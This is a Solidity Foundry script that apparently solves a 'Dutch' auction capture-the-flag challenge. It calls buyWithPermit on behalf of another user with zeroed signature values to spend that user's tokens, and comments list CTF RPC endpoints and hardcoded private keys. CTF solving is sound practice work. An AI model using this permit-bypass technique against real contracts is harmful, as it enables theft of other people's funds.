// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// import "src/Dutch/src/Challenge.sol";
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/Script.sol";
import {console} from "forge-std/Test.sol";
import {Script, console} from "forge-std/Script.sol";

interface IAuction {
    function token() external view returns (address);
    function buyWithPermit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function buy() external;
}

contract Challenge {
    address public art;
    IAuction public auction;
    address public user;

    function isSolved() external view returns (bool) {}
}

contract Dutch is Script {
    function setUp() public {}

    function run() external {
        uint256 privateKey = 0x13631c990620c57a85511d20f8548d40ed99f67155a175e7a04a759b1cb412c3;
        address target = 0x63404A6F840479EB95ff3a0177954dCf6C5dC44c;

        VmSafe.Wallet memory wallet = vm.createWallet(privateKey);
        address publicAddress = wallet.addr;
        console.log("publicAddress", publicAddress);
        console.log("eth balance: %e ", (publicAddress.balance));
        vm.startBroadcast(privateKey);

        Challenge challenge = Challenge(target);
        console.log("is Challenge complete", challenge.isSolved());
        IAuction auction = challenge.auction();
        address token = auction.token();
        console.log("token", token);
        ERC20(token).approve(address(auction), type(uint256).max);

        console.log("auction", address(auction));
        console.log("auction balance %e", address(auction).balance);
        console.log("auction token balance %e ", ERC20(token).balanceOf(address(auction)));
        address art = challenge.art();
        console.log("art", art);
        address user = challenge.user();
        console.log("user", user);
        console.log("user balance %e", user.balance);
        auction.buyWithPermit(user, user, 0, 0, 0, 0, 0);

        console.log("is Challenge complete", challenge.isSolved());

        vm.stopBroadcast();
    }
}

// ---
// rpc endpoints:
//     - http://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main
//     - ws://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main/ws
// private key:        0x0b49634a1806a51e69decf63f876d3eb48755439779a13c6685b644daace34ec
// challenge contract: 0x976019eF0cD87c8cb54B95b04Ed64e40E842b8C0

// forge script  "Deploy" -w "src/script" \
//  -f "http://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main" \
//  --private-key  "0x0b49634a1806a51e69decf63f876d3eb48755439779a13c6685b644daace34ec"
